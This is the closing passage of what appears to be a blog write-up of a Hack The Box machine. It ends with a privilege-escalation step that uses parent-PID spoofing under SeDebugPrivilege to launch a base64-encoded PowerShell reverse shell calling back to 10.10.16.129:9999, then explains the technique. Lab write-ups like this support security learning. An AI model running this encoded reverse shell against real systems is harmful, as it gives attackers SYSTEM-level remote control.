+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\a</span>laading<span class=se>\D</span>ocuments&gt; ImpersonateFromParentPid -ppid <span class=m>556</span> -command <span class=s2>&#34;C:\Windows\System32\cmd.exe&#34;</span> -cmdargs <span class=s2>&#34;/c powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADYALgAxADIAOQAiACwAOQA5ADkAOQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABvAD0AKABpAGUAeAAgACQAZAAgADIAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABvACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==&#34;</span>
+</span></span></code></pre></div><p>SYSTEM shell came back on the listener. Root flag.</p><p><em>References: <a href=https://github.com/decoder-it/psgetsystem>github.com/decoder-it/psgetsystem</a>, <a href=https://pentestlab.blog/2020/02/24/parent-pid-spoofing/>pentestlab.blog - Parent PID Spoofing</a></em></p><p>The PPID spoofing technique is the thing I&rsquo;d take from this box. Most people reach for token impersonation or process injection when they see SeDebugPrivilege, but the parent PID approach is different. You&rsquo;re not injecting code into another process at all. You&rsquo;re just creating a brand new process and claiming a SYSTEM process as its parent. Windows hands over the token because that&rsquo;s what token inheritance is supposed to do.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
+<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
+<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
+<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
+</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
